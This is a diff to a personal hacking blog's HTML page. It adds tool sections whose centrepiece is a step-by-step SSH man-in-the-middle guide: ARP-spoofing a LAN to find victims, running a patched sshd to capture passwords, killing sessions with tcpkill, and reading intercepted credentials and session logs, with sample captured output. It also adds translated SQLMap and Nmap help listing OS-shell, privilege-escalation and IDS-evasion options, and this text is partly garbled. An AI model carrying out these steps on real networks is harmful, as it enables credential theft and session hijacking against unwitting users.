@@ -119,7 +119,7 @@
           <div class="mainTextPlain">PENTEST:</div> <a href="#private chat">private chat </a>/ <a href="#maleware">maleware</a>
           <div class="mainTextPlain">HARDWARE:</div>
           <div class="mainTextPlain">SOFTWARE:</div>
-          <div class="mainTextPlain">TOOLS:</div> <a href="#WIFI // Airgeddon">WIFI-Airgeddon </a>/ <a href="#encrypter">encrypter </a>/ <a href="#pswd">Linux pswd gen</a>
+          <div class="mainTextPlain">TOOLS:</div> <a href="#WIFI // Airgeddon">WIFI-Airgeddon </a>/ <a href="#encrypter">encrypter </a>/ <a href="#pswd">Linux pswd gen</a>/ <a href="#SSH MITM"> SSH MITM</a> /<a href="#SQLMap"> SQLMap</a>
           <div class="mainTextAfter" >The site has an open source code lying on, directly github. I am far from a web designer or layout designer, so there may be mistakes, mainly due to not quite adaptive design. I will be glad if you write to me about them.</div>
           </details>
       </div>
@@ -2141,12 +2141,602 @@ void display_skeksi(void)
           <div class="greetingHeader">Tools of various types of orientation, used in my activities</div>
           <div class="mainTextAfter"></div>
           </div>
-        </div>
+      </div>
 
 
+	  <div class="mainBlogContainer">
+		<a name="SSH MITM"></a>
+		<div class="greetings">
+			<div class="greetingHeader">SSH MITM</div>
+		  <pre class="toolsLogo">
+                              ___-___  o==o======   .   .   .   .   .
+=========== ||//
+\ \ |//__
+#_______/
+		  </pre>
+
+		  <details>
+			<summary><pre>
+   _____
+  |==   |
+  |  o. |
+  |__O__|
+			 </pre></summary>
+			 <div class="mainTextPlain">This is a penetration tester tool that allows the auditor to intercept SSH connections. The tool is based on the OpenSSH v7.5p1 source code, which is patched in a special way, which turns it into a proxy between the victim and the SSH server to which she is trying to connect; all passwords transmitted in plain text and sessions are intercepted and saved to the attacker's disk.</div>
+			 <div class="mainTextPlain">Of course, the victim's SSH client will complain that the server key has changed. But since in 99.99999% of cases this is caused by legitimate actions (reinstalling the OS, configuration changes, etc.), many/most users ignore this warning and continue.</div>
+			 <div class="mainTextPlain">note: It is recommended to run the modified sshd_mitm only in the virtual machine container! The changes made in OpenSSH affect critical areas of the code without regard to security. It's not hard to imagine that these changes have opened up serious vulnerabilities.</div>
+			 <div class="mainText">-h</div>
+			 <div class="mainTextPlain">The program has no options, files are used to start and stop the attack start.sh and stop.sh . Script JoesAwesomeSSHMITMVictimFinder.py it is used to search for targets before an attack. That is, this script is looking for computers with SSH connections.</div>
+			 <div class="mainText">Launch examples</div>
+			 <div class="mainTextPlain">JoesAwesomeSSHMITMVictimFinder script.py makes finding targets on the local network very simple. It performs an ARP attack spoofing IP blocks for a short time and sniff traffic in search of SSH connections. IP addresses are not attacked simultaneously, but in small blocks for a short time — all blocks are processed sequentially, when the script reaches the last one, then everything starts over. It will report all outgoing SSH connections coming from devices on the LAN. By default JoesAwesomeSSHMITMVictimFinder.py it will perform ARP spoofing and sniff only 5 IP addresses at a time for 20 seconds before moving on to the next block of 5 addresses. These parameters can be configured based on the following compromise: the more IP is spoofed (attacked) at a time, the higher the chance that you will catch an outgoing SSH connection, but also the load on your network interface increases, which is rarely designed for such intensive work on home computers. Under too much load, your interface will start dropping frames, which will lead to denial-of-service (network problems) and greatly increase suspicion (which is bad). This default value should not lead to problems in most cases, although it will lead to a longer search for goals. For low-load networks, the block size can be safely increased.</div>
+			 <div class="textHolder">./JoesAwesomeSSHMITMVictimFinder.py --interface enp0s3 --ignore-ips 10.11.12.50,10.11.12.53</div>
+			 <div class="mainText">output</div>
+			 <div class="textHolder"><pre>
+				Found local address 10.11.12.141 and adding to ignore list.
+				Using network CIDR 10.11.12.141/24.
+				Found default gateway: 10.11.12.1
+				IP blocks of size 5 will be spoofed for 20 seconds each.
+				The following IPs will be skipped: 10.11.12.50 10.11.12.53 10.11.12.141
+				 
+				 
+				Local clients:
+				  * 10.11.12.70 -> 174.129.77.155:22
+				  * 10.11.12.43 -> 10.11.99.2:22</pre></div>
+			 <div class="mainTextPlain">The above output shows that two devices on the local network have created SSH connections (10.11.12.43 and 10.11.12.70); they can become targets for a man-in-the-middle attack. However, remember, in order to potentially intercept credentials, you need to wait for them to initiate new connections. Impatient pentesters can optionally forcibly close existing SSH sessions (using the tcpkill tool) so that clients are immediately prompted to create new ones…</div>
+			 <div class="mainText">launching</div>
+			 <div class="mainText">After you have completed the initial installation and found the list of potential victims (see above), you need to run the script from root start.sh using sudo. Run this script sshd_mitm, enable IP forwarding and configure SSH packet interception via iptables. Launch ARP spoofing of the target(s). Advice from professionals: DO NOT spoof everything! Your home network interface is unlikely to be able to handle the traffic of the entire local network at the same time. Perform a spoofing attack using arpspoof against a couple of IP addresses at a time. Alternatively, you can use the ettercap tool. Monitor the contents of auth.log. The intercepted passwords will appear there. After installing the session, the full input and output log can be found in /home/ssh-mitm/. SSH sessions are recorded as shell_session_*.txt, and SFTP sessions are recorded as sftp_session_*.html (with the transferred files saved in the corresponding directory). If successful, the /var/log/auth.log file will have the following lines in which the password is written:</div>
+			 <div class="textHolderAvarage">Sep 11 19:28:14 showmeyourmoves sshd_mitm[16798]: INTERCEPTED PASSWORD: hostname: [10.199.30.x]; username: [jdog]; password: [supercalifragilistic] [preauth]</div>
+			 <div class="mainTextPlain">Next, the victim's SSH session is recorded in full:</div>
+			 <div class="textHolderAvarage">cat /home/ssh-mitm/shell_session_0.txt</div>
+			 <div class="mainText">output</div>
+			 <div class="textHolder"><pre>
+Hostname: 10.199.30.x
+Username: jdog
+Password: supercalifragilistic
+-------------------------
+Last login: Thu Aug 31 17:42:38 2017
+OpenBSD 6.1 (GENERIC.MP) #21: Wed Aug 30 08:21:38 CEST 2017
+ 
+Welcome to OpenBSD: The proactively secure Unix-like operating system.
+ 
+Please use the sendbug(1) utility to report bugs in the system.
+Before reporting a bug, please try to reproduce it with the latest
+version of the code.  With bug reports, please try to ensure that
+enough information to reproduce the problem is enclosed, and if a
+known fix for it exists, include that as well.
+ 
+jdog@jefferson ~ $ ppss
+  PID TT  STAT       TIME COMMAND
+59264 p0  Ss      0:00.02 -bash (bash)
+52132 p0  R+p     0:00.00 ps
+jdog@jefferson ~ $ iidd
+uid=1000(jdog) gid=1000(jdog) groups=1000(jdog), 0(wheel)
+jdog@jefferson ~ $ sssshh  jjtteessttaa@@mmaaggiiccbbooxx
+jtesta@magicbox's password: ROFLC0PTER!!1juan
+			 </pre></div>
+			 <div class="mainText">Remember that characters in user commands must appear twice in the file, since input from the user is recorded, and output from the shell is also recorded (which repeats (echo) characters). Note that when programs like sudo and ssh temporarily disable the repetition of the password entered by the user for reading, duplicate characters do not get into the log. All SFTP activity is also captured. Use the browser to view sftp_session_0.html . This file records all commands with links to uploaded and uploaded files:</div>
+			 <div class="textHolderAvarage">cat /home/ssh-mitm/sftp_session_0.txt</div>
+			 <div class="mainText">output</div>
+			 <div class="textHolder"><pre>
+				<html><pre>
+Hostname: 10.199.30.x
+Username: jdog
+Password: supercalifragilistic
+-------------------------
+> realpath "." (Result: /home/jdog)
+> realpath "/home/jdog/." (Result: /home/jdog)
+> ls /home/jdog
+drwxr-xr-x    4 jdog     jdog         4096 Sep 11 16:12 .
+drwxr-xr-x    4 root     root         4096 Sep  6 11:53 ..
+-rw-r--r--    1 jdog     jdog         3771 Aug 31  2015 .bashrc
+-rw-r--r--    1 jdog     jdog          220 Aug 31  2015 .bash_logout
+drwx------    2 jdog     jdog         4096 Sep  6 11:54 .cache
+-rw-r--r--    1 jdog     jdog          655 May 16 08:49 .profile
+drwx------    2 jdog     jdog         4096 Sep  8 16:59 .ssh
+-rw-rw-r--    1 jdog     jdog      5242880 Sep  8 15:52 file
+-rw-rw-r--    1 jdog     jdog        43131 Sep 10 10:47 file2
+-rw-rw-r--    1 jdog     jdog           83 Sep  6 12:56 file3
+-rw-rw-r--    1 jdog     jdog      3048960 Sep 11 13:51 file4
+ 
+> realpath "/home/jdog/file5" (Result: /home/jdog/file5)
+> put <a href="sftp_session_0/file5">/home/jdog/file5</a>
+> realpath "/home/jdog/file5" (Result: /home/jdog/file5)
+> stat "/home/jdog/file5" (Result: flags: 15; size: 854072; uid: 1001; gid: 1001; perm: 0100664, atime: 1505172831, mtime: 1505172831)
+> setstat "/home/jdog/file5" (Result: flags: 4; size: 0; uid: 0; gid: 0; perm: 0100700, atime: 0, mtime: 0)
+</pre></html>
+
+			 </pre></div>
+		  </details>
+		</div>
+	  </div>
 
 
+	  <div class="mainBlogContainer">
+		<a name="SQLMap"></a>
+		<div class="greetings">
+			<div class="greetingHeader">SQLMap</div>
+		  <pre class="toolsLogo">
+/\_/\
+((@v@))
+():::()
+VV-VV
+		  </pre>
 
+		  <details>
+			<summary><pre>
+   _____
+  |==   |
+  |  o. |
+  |__O__|
+			 </pre></summary>
+			 <div class="mainTextPlain">sqlmap is an open source penetration testing tool that automates the process of identifying and exploiting SQL injection vulnerabilities and capturing database servers. It comes with a powerful detection engine and many niche functions for the end penetration tester, has a wide range of capabilities, ranging from collecting database fingerprints from the data received from them, to accessing the file system and executing commands in the operating system via out-of-band connections.</div>
+			 <div class="textHolder"><pre>
+--h, --help Show basic help and exit
+-hh Show advanced help and exit
+--version Show program version number and exit
+-v VERBOSE Verbality level: 0-6 (default 1)
+-u URL, --url=URL of the Target URL (for example,
+-d DIRECT Connection string for direct connection to the database
+-l LOGFILE To parse the target(s) from the Burp or WebScarab log files    
+--m BULK FILE Scan multiple targets set in a text file    
+-r REQUESTFILE Load HTTP requests from a file    
+--g GOOGLEDORK Process Google dark results as target URLs
+--c CONFIG FILE Load options from the INI configuration file
+-A AGENT, --user-agent=AGENT Using the value of the User-Agent header
+    -H HEADER, --hea..    Additional header (for example, "X-Forwarded-For: 127.0.0.1")
+--method=METHOD to force the use of the specified HTTP method (for example, PUT)
+--data=DATA Data string to send via POST
+--param-del=SECTION_PAR Character used to separate parameter values
+--cookie=COOKIE HTTP cookie header value
+    --cookie-del=SEPARATOR_COOKIE Symbol used to separate cookie values
+    --live-cookies=L..    A file of changing cookies, used to load the current values
+--load-cookies=FILE_TO_LOAD A file containing cookies in the Netscape/wget format 
+    --drop-set-cookie Ignore the Set-Cookie header from the response
+    --mobile Using the HTTP User-Agent header to simulate a smartphone
+--random-agent Use a randomly selected value of the HTTP User-Agent header 
+    --host=HOST HTTP
+host header value --referer=REFERRER HTTP Referer header value
+    --headers=HEADERS Additional headers (for example, "Accept-Language: fr\nETag: 123")
+--auth-type=HTTP authentication type type (Basic, Digest, NTLM or PKI)
+--auth-cred=DATA_OUT HTTP Authentication credentials (name:password)
+--auth-file=FILE_OUT HTTP authentication file PEM certificate/private key
+    --ignore-401 Ignore HTTP 401 error (Unauthorized)
+--ignore-proxy Ignore default proxy system settings
+--ignore-redirects Ignore redirect attempts
+    --ignore-timeouts Ignore connection
+timeouts --proxy=PROXY Use proxy to connect to the target URL
+--proxy-cred=ACCOUNT_PROXY Proxy Authentication Credentials (name:password)
+--proxy-file=FILE_PROXY Download proxy list from file
+    --proxy-freq=PRO..     Requests between proxy changes from a given list
+    --tor Use the anonymous Tor network
+    --tor-port=TORPORT Set Tor proxy port other than default
+--tor-type=TORTYPE Set Tor proxy type (HTTP (default), SOCKS4 or SOCKS5)
+    --check-tor To check if Tor is being used properly
+--delay=DELAY Delay in seconds between each HTTP request
+--timeout=TIMEOUT Seconds to wait before connection timeout (default 30)
+--retries=ATTEMPTS Attempts at connection timeouts (default 3)
+--randomize=PARAMETERS Randomly change the values of this parameter(s)
+--safe-url=SAFE_EURL URL for frequent visits during testing
+--safe-post=POST POST data to send to a secure URL
+    --safe-req=SAFE_FILE Load safe HTTP request from a file
+--safe-freq=NUMBER of test requests between two visits to a given secure URL
+--skip-urlencode Skip URL encoding data for requests
+--csrf-token=CSR..     The parameter used to hold the anti-CSRF token
+--csrf-url=CSRFURL URL to visit to retrieve the anti-CSRF token
+--csrf-method=CS..     HTTP method to use when visiting a page with an anti-CSRF token
+--csrf-retries=C..     Repeated attempts to obtain an anti-CSRF token (0 by default)
+    --force-ssl Forced use of SSL/HTTPS
+--chunked Use HTTP requests with fragmented data transmission (POST)
+--hpp Use the method of polluting the HTTP parameter
+--eval=EVALCODE Execute this Python code before the request (for example,
+                           "import hashlib;id2=hashlib.md5(id).hexdigest()")
+-o Disable all optimization switches
+--predict-output Predict the total output of requests
+--keep-alive Use persistent HTTP(s)
+connections --null-connection Get the page length without the actual HTTP response body
+--threads=THREADS Maximum number of simultaneous HTTP(s) requests (default 1)
+-p TESTPARAMETER Test parameter(s)
+--skip=SKIP Skip testing this parameter(s)
+--skip-static Skip testing parameters that do not seem dynamic
+--param-exclude=..  A regular expression for excluding parameters from testing (for example, "ses")
+--param-filter=P..  Select the parameters to be checked locally (for example, "POST")
+--dbms=DBMS Force to specify the DBMS
+    --dbms-cred=DBMS..  DBMS authentication data (user:password)
+--os=OS Force to specify the DBMS operating system
+    --invalid-bignum Use large numbers for invalid values
+--invalid-logical Use logical operations for invalid values
+--invalid-string Use random strings for invalid values
+--no-cast Disable payload selection mechanism
+    --no-escape Disable the string escaping mechanism
+--prefix=PREFIX The preceding line of the injection request
+--suffix=SUFFIX The ending line of the injection request
+    --tamper=TAMPER Use this script(s) for injection data obfuscation
+	--level=LEVEL of testing execution level (1-5, default 1)
+--risk=RISK of testing being performed (1-3, default 1)
+--string=STRING String when the query is executed in True (True)
+--not-string=NOT_TRUE String when the query is executed in False (False)
+--regexp=REGEXP A regular expression when the query is executed in True
+--code=HTTP CODE code when the request is executed in True (True)
+----smart Perform thorough tests only if the heuristic is positive.
+    --text-only Compare pages based only on text content
+--titles Compare pages based only on their titles
+--technique=SQL Injection Technique technique to use (default is "BEUSTQ")
+----time-sec=TIME SEC Seconds to delay DBMS response (default is 5)
+----union-cols=COLS Column range for testing with UNION SQL Injection queries
+----union-char=CHAR Symbol for use when bruteforsing the number of columns
+----union-from=FROM Table for use in the FROM part of the UNION SQL injection query
+--dns-domain=DOMAIN Domain name used for DNS exfiltration attack
+    --second-url=SEC..     The URL of the resulting page is searched for a second-order response
+    --second-req=SEC..     Download a second-order HTTP request from a file
+	-f, --fingerprint Performs extensive reconciliation of the DBMS version
+	-a, --all Get all
+-b, --banner Get DBMS banner
+    --current-user Get the current DBMS user
+    --current-db Get the current DBMS database
+    --hostname Get the DBMS server hostname
+    --is-dba To determine whether the current user is a DBMS administrator
+    --users List DBMS users
+    --passwords List the password hashes of DBMS users
+    --privileges List DBMS user privileges
+    --roles List custom DBMS roles
+    --dbs List DBMS databases
+    --tables List DBMS database tables
+    --columns List the columns of the DBMS table
+    --schema List the DBMS schema
+    --count List the number of records for the table(s)
+--dump Dump the records of the DBMS database table
+    --dump-all Dump all DBMS database table entries
+    --search Search for column(s), tables(s) and/or database name(s)
+--comments Get DBMS comments
+    --statements Get SQL statements executed in the DBMS
+    -D DB DBMS database for enumeration
+-T TBL DBMS Database Table(s) for enumeration
+-C COUNT Column(s) DBMS database tables for enumeration
+-X SKIP Column(s) DBMS database for non-enumeration
+-U USER DBMS Users for enumeration
+--exclude-sysdbs Try system DBMS databases when enumerating tables
+    --pivot-column=P..  Name of the Pivot column
+    --where=DUMPWHERE Use the WHERE condition when dumping tables
+    --start=LIMITSTART The first output record of the query to receive
+--stop=LIMITSTOP The last output record of the query to receive
+--first=FIRSTCHAR The first character of the output word of the query to receive
+--last=LASTCHAR The last character of the output word of the query to receive
+--sql-query=QUERY SQL expression to execute
+--sql-shell Interactive SQL shell prompt
+--sql-file=SQLFILE Execute SQL expression from this file(s)
+--common-tables Check for common tables
+    --common-columns Check for common columns
+--common-files Check for the existence of common files
+--udf-inject Inserting user-defined functions
+--shared-lib=SHLIB Local path to shared library
+----file-read=FILE Read a file from the DBMS file system
+    ----file-write=FILE Write a local file to the DBMS file system
+    ----file-dest=FILE Absolute path to write the file to the DBMS
+	----os-cmd=CMD Execute OS command
+    --os-shell Interactive shell invitation OS
+    ----os-pwn Invitation for out-of-band shell, Meterpreter or VNC
+--os-smbrelay Single-click invitation for out-of-band shell, Meterpreter or VNC
+--os-bof Operation of buffer overflow of stored procedure
+    ----privesc Increase of user privileges of the DB process
+    ----sf-path=MAX PATH Local path where Metasploit Framework is installed
+    ----tmp-path=TMP PATH Remote absolute path of the temporary files directory
+	--reg-read To read the value of the Windows register key
+    --reg-add Record the value of the Windows register key
+    --reg-del Delete Windows register key value
+    ----reg-key=REG KEY Windows Register key
+    ----reg-value=REG VAL Windows register key value
+    ----regata=REGATA Data values of the Windows registry key
+    ----retype=RETYPE The type of the Windows register key value
+	-s SESSIONFILE Load a session from a saved file (.sqlite)
+-t TRAFFICFILE Write all HTTP traffic to a text file
+    --answers=ANSWERS Set the answer to the question (for example, "quit=N,follow=N")
+--base64=BASE64P..  Parameters containing Base64 encoded data
+    --base64-safe Use the Base64 safe alphabet for URLs and file names (RFC 4648)
+--batch Never ask for user input, use the default behavior
+--binary-fields=..  The result fields have binary values (for example, "digest")
+    --check-internet Check your Internet connection before evaluating the goal
+--cleanup To clear the DBMS of sqlmap-specific user functions and tables
+    --crawl=CRAWLDEPTH Scan the website starting from the target URL
+--crawl-exclude=..  Regular expression for excluding pages from scanning (for example, "output")
+--csv-del=CSVDEL Separator character used in CSV output (default ",")
+--charset=CHARSET Forced encoding of characters used to retrieve data
+    --check-internet To check the Internet connection before evaluating the goal
+--crawl=CRAWLDEPTH To crawl the website starting from the specified URL
+--crawl-exclude=REGEXPRESSION A regular expression to exclude pages for crawling (for example, "logout")
+--csv-del=CSVDEL Separator character used in CSV output (by default ",")
+--dump-format=DUMPFORMAT Format of the sampled data (CSV (default), HTML or SQLITE)
+--encoding=ENCOD..  Character encoding used to get data (for example, GBK)
+    --eta Display the approximate arrival time for each output
+    --flush-session Erase session files for the current target
+--forms Parse and test forms on the target URL
+--fresh-queries Ignore query results saved in the session file
+    --gpage=GOOGLEPAGE Use Google's dork results from the specified page number
+--har=HARFILE Write all HTTP traffic to a HAR file
+    --hex Use the hexadecimal function(ai) of the DBMS to get data
+    --output-dir=OUT..  Custom path of the output directory
+--parse-errors To parse and display DBMS error messages from responses
+--preprocess=PRE..  Use this script(s) for preprocessing (request)
+--postprocess=PO..  Use this script(s) for post-processing (response)
+--repair to reset the records that have the mark of an unknown character (?)
+--save=SAVECONFIG Save options to the configuration INI file
+    --scope=SCOPE Regular expression for filtering targets from proxy log
+    --skip-heuristics Skip heuristic detection of SQLi/XSS vulnerabilities
+--skip-waf Skip heuristic detection of WAF/IPS protection
+    --table-prefix=T..  Prefix used for temporary tables (default: "sqlmap")
+--test-filter=TE..  Select tests by payload and/or names (for example, ROW)
+--test-skip=TEST..  Skip tests on payload and/or names (for example, BENCHMARK)
+--web-root=WEBROOT Root directory of the web server (for example, "/var/www")
+			 </pre></div>
+		  </details>
+		</div>
+	  </div>
+
+
+	  <div class="mainBlogContainer">
+		<a name="Nmap"></a>
+		<div class="greetings">
+			<div class="greetingHeader">Nmap</div>
+		  <pre class="toolsLogo">
+ \      oo
+  \____|\mm
+  //_//\ \_\
+ /K-9/  \/_/
+/___/_____\
+-----------
+		  </pre>
+
+		  <details>
+			<summary><pre>
+   _____
+  |==   |
+  |  o. |
+  |__O__|
+			 </pre></summary>
+			 <div class="mainTextPlain">Nmap ("Network Mapper") is an open source utility for network exploration and security verification. Many system administrators and network administrators also find it useful for tasks such as network inventory, managing the schedule of update services and monitoring uptime of hosts or services. Nmap uses raw IP packets in an innovative way to determine which hosts are available on the network, which services (application name and version) these hosts suggest which operating systems (and OS versions) are running there, what types of packet filters/firewalls are used, and dozens of other characteristics. It was created to quickly scan large networks, but it works and works fine with single hosts. Nmap runs on all popular operating systems, and official executable packages are available for Linux, Windows, and Mac OS X. In addition to the classic version of the command-line Nmap, the Nmap suite includes an advanced graphical interface and results viewer (Zenmap), a flexible data transfer, redirection and debugging tool (Ncat), a utility for comparing scan results (Ndiff), and a packet generation and response analysis tool (Nping). He has even been featured in twelve films, including The Matrix Reboot, Die Hard 4, Girl With the Dragon Tattoo and the Bourne Ultimatum.</div>
+			 <div class="textHolder"><pre>
+				DETERMINING THE SCANNING TARGET:
+ You can use network names, IP addresses, networks, etc.
+  Example: scanme.nmap.org , microsoft.com/24 , 192.168.0.1; 10.0.0-255.1-254
+  -il &lt input filename>: Use the list of hosts/networks from the file
+  -ir &ltnumber of hosts>: Select arbitrary targets
+--exclude &lthost1[,host2][,host3],...>: Exclude hosts/networks
+--excludefile &ltfile_name>: Exclude the list from the file
+HOST DISCOVERY:
+  -sL: Scanning for the purpose of making a list - just make a list of targets to scan
+  -sn: Ping scan - disable port scanning
+  -Pn: Treat all hosts as if they are online -- skip host detection
+  -PS/PA/PU/PY[port list]: TCP SYN/ACK, UDP or SCTP port data detection pinging of specified ports
+  -PE/PP/PM: Ping using ICMP echo requests, timestamp requests and network mask
+  -PO[list_protocols]: Pinging using the IP protocol
+-n/-R: Never perform DNS resolution/Always resolve [default: sometimes]
+--dns servers &ltserver1[,server2],...>: Set your own DNS servers
+--system-dns: Use a system DNS converter
+  --traceroute: Track the path to the host
+VARIOUS SCANNING TECHNIQUES:
+  -sS/st/sa/sW/sM: TCP SYN/using the Connect()/ACK/Window/Maimon scan system call
+  -sU: UDP scan
+  -sN/sF/sX: TCP Null, FIN and Xmas scans
+--scanflags &ltflags>: Set your own TCP flags
+  -sI &ltzombi_host[:port]>: "Lazy" (Idle) scanning
+  -sY/sZ: SCTP INIT/COOKIE-ECHO scan
+  -sO: IP Protocol scanning
+  -b &ltFTP relay host>: FTP bounce scan
+DEFINING PORTS AND SCANNING ORDER:
+  -p &ltport_range>: Scan only specific ports
+    Example: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9
+--exclude-ports &ltport ranges>: Exclude the specified ports from scanning
+-F: Fast mode - Scan fewer ports than when scanning by default
+-r: Scan ports sequentially - do not use random order of ports
+--top-ports &ltnumber of ports>: Scan &ltnumber of ports> the most common ports
+--port-ratio &ltrating>: Scan ports with a rating greater than &ltrating>
+DEFINING SERVICES AND THEIR VERSIONS:
+  -sV: Explore open ports to determine service/version information
+  --version-intensity &ltlevel>: Set from 0 (light) to 9 (try all queries)
+--version-light: Limit to the lightest queries (intensity 2)
+--version-all: Use each single query (intensity 9)
+--version-trace: Output detailed information about the scanning process (for debugging)
+SCANNING WITH THE USE OF SCRIPTS:
+  -sC: equivalent to the option --script=default
+--script=&ltLua scripts>: &ltLua scripts> this is a comma-separated list of directories, script files, or script
+categories
+  --script-args=&ltname1=value1,[name2=value2,...]>: Passing arguments to scripts
+--script-args-file=file_name: pass arguments to the NSE script in the file
+  --script-trace: Output all received and sent data
+--script-updatedb: Update the script database.
+  --script-help=&ltLua scripts>: Show help about scripts.
+  &ltLua scripts> comma-separated list of script files or script
+categories.
+OS DEFINITION:
+  -O: Activate the OS detection function
+--osscan-limit: Use the OS detection function only for "promising" hosts
+  --osscan-guess: Guess the results of the OS definition
+TIME AND PERFORMANCE MANAGEMENT OPTIONS:
+  Options that take the &lttime> argument are set in milliseconds until you add 's' (seconds), 'm' (minutes),
+or 'h' (hours) to the value (e.g. 30m).
+  -T[0-5]: Set a template for time management settings (larger - faster)
+--min-hostgroup/max-hostgroup &lthost_group>: Set the size of groups for parallel scanning
+--min-parallelism/max-parallelism &lthost_group>: Adjusts the parallelization of requests
+  --min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout &lttime>: Regulates the waiting time for a response to a request
+  --max-retries &ltamount of excess>: Sets the maximum number of request retransmissions
+--host-timeout &lttime>: Stops scanning slow targets
+  --scan-delay/--max-scan-delay &lttime>: Regulates the delay between requests
+--min-rate &ltnumber>: Send requests with an intensity not less than &ltnumber> per second
+--max-rate &ltnumber>: Send requests with an intensity not more than &ltnumber> per second
+FIREWALL/IDS BYPASS AND SPOOFING:
+  -f; --mtu &ltvalue>: Fragment packets (optionally with a given MTU value)
+-D &ltfix_host1,fix_host2[,ME],...>: Masking scanning using dummy hosts
+  -S &ltip_address>: Change the source address
+  -e &ltinterface>: Use a specific interface
+-g/--source-port &ltport_number>: Use the specified port number
+  --proxies &lturl1,[url2],...>: Forward connections via HTTP/SOCKS4 proxy
+  --data &lthex string>: Append a custom payload to sent packets
+  --data-string &ltstring>: Append a custom ASCII string to the sent packets
+  --data-length &ltnumber>: Add arbitrary data to sent packets
+--ip-options &ltoptions>: Send a packet with the specified ip options
+--ttl &ltvalue>: Set the IP field time-to-live (lifetime)
+--spoof-mac &ltmas_address/prefix/manufacturer name>: Set own MAC address
+  --badsum: Send packets with dummy TCP/UDP checksums
+OUTPUT OF RESULTS:
+  -oN/-oX/-os/-oG &ltfile>: Output the results of normal, XML, s|&ltrIpt kIddi3,
+     and Grepable output format, respectively, to the specified file
+  -oA &ltbase_file name>: Use three main output formats at once
+  -v: Increase the verbality level (use -vv or more to enhance the effect)
+-d: Increase the debugging level (use -dd or more to enhance the effect)
+--reason: Display the reason why the port is in a particular state
+--open: Show only open (or possibly open) ports
+--packet-trace: Tracking received and transmitted packets
+--iflist: List interfaces and routers (for debugging)
+--append-output: Add to the end, not overwrite output files
+--resume &ltfile_name>: Continue interrupted scanning
+  --stylesheet &ltpath/URL>: Sets XSL stylesheet to convert XML output to HTML
+--webxml: Loads stylesheet from Nmap.Org
+--no-stylesheet: Remove XSL stylesheet declaration from XML
+VARIOUS OPTIONS:
+  -6: Enable IPv6 scanning
+-A: Activate OS and version detection functions, script scanning and tracing
+  --datadir &ltdirectory name>: Specifies the location of the Nmap files
+  --send-eth/--send-ip: Use raw ethernet/IP
+layer --privileged: Imply that the user has all privileges
+  --unprivileged: Imply that the user does not have privileges to use raw sockets
+-V: Output the version number
+  -h: Display this help page.
+examples:
+  nmap -v -A scanme.nmap.org
+  nmap -v -sn 192.168.0.0/16 10.0.0.0/8
+  nmap -v -iR 10000 -Pn -p 80
+			 </pre></div>
+			 <div class="mainText">Nmap (“Network Mapper”) is an open source utility for network exploration and security verification. It was designed to quickly scan large networks, although it copes well with single targets. Nmap uses raw IP packets in original ways to determine which hosts are available on the network, which services (application name and version) they suggest which operating systems (and OS versions) they use, what types of packet filters/firewalls are used and dozens more other characteristics. While Nmap is commonly used for security checks, many network and system administrators find it useful for common tasks such as monitoring network structure, managing service startup schedules, and keeping track of host or service hours. The output of Nmap is a list of scanned targets with additional information for each, depending on the specified options. The key information is the “table of important ports". This table contains the port number, protocol, service name, and status. The state can have the value open (open), filtered (filtered), closed (closed) or unfiltered (not filtered). Open means that the application on the target machine is ready to establish a connection/accept packets on this port. Filtered means that a firewall, network filter, or some other interference in the network is blocking the port, and Nmap cannot set whether this port is open or closed. Closed ports are not associated with any application, so they can be opened at any time. The port is classified as not filtered when they respond to Nmap probes, but Nmap cannot determine if they are open or closed. Nmap reports the status of ports with combinations of open|filtered and closed|filtered when it cannot determine which of the two states describes the port. If there was a request to determine the version, the ports table may also include details about the software version. When an IP Protocol (-sO) scan is requested, Nmap provides information about supported IP protocols, not about the ports being listened to. In addition to the table of important ports, Nmap can provide further information about the targets: converted DNS names, an assumption about the operating system used, device types and MAC addresses. A typical scan using Nmap is shown in the Example . The only arguments used in this example are -A, to determine the OS version, scanning using scripts and tracing; -T4 for faster execution; then the target host.</div>
+			 <div class="textHolder"><pre>
+sudo nmap -A -T4 scanme.nmap.org
+ 
+Nmap scan report for scanme.nmap.org (74.207.244.221)
+Host is up (0.029s latency).
+rDNS record for 74.207.244.221: li86-221.members.linode.com
+Not shown: 995 closed ports
+PORT     STATE    SERVICE     VERSION
+22/tcp   open     ssh         OpenSSH 5.3p1 Debian 3ubuntu7 (protocol 2.0)
+| ssh-hostkey: 1024 8d:60:f1:7c:ca:b7:3d:0a:d6:67:54:9d:69:d9:b9:dd (DSA)
+|_2048 79:f8:09:ac:d4:e2:32:42:10:49:d3:bd:20:82:85:ec (RSA)
+80/tcp   open     http        Apache httpd 2.2.14 ((Ubuntu))
+|_http-title: Go ahead and ScanMe!
+646/tcp  filtered ldp
+1720/tcp filtered H.323/Q.931
+9929/tcp open     nping-echo  Nping echo
+Device type: general purpose
+Running: Linux 2.6.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6.39
+OS details: Linux 2.6.39
+Network Distance: 11 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:kernel
+ 
+TRACEROUTE (using port 53/tcp)
+HOP RTT      ADDRESS
+[Cut first 10 hops for brevity]
+11  17.65 ms li86-221.members.linode.com (74.207.244.221)
+ 
+Nmap done: 1 IP address (1 host up) scanned in 14.40 seconds
+			 </pre></div>
+		  </details>
+		</div>
+	  </div>
+
+
+	  <div class="mainBlogContainer">
+		<a name="Crunch"></a>
+		<div class="greetings">
+			<div class="greetingHeader">Crunch</div>
+		  <pre class="toolsLogo">
+q-p
+/\"/\
+(`=*=')
+    ^---^`-._
+		  </pre>
+
+		  <details>
+			<summary><pre>
+   _____
+  |==   |
+  |  o. |
+  |__O__|
+			 </pre></summary>
+			 <div class="mainTextPlain">Crunch is a word list generator in which you can specify one of the standard character sets (numbers, large and small letters) or a character set of your choice. crunch can generate all possible combinations and permutations according to the specified criteria. The data that crunch outputs can be displayed on the screen, saved to a file, or transferred to another program.</div>
+
+		  </details>
+		</div>
+	  </div>
+
+
+	  <div class="mainBlogContainer">
+		<a name="JTR"></a>
+		<div class="greetings">
+			<div class="greetingHeader">John the Ripper</div>
+		  <pre class="toolsLogo">
+  //
+ ('>
+ /rr
+*\))_
+
+		  </pre>
+
+		  <details>
+			<summary><pre>
+   _____
+  |==   |
+  |  o. |
+  |__O__|
+			 </pre></summary>
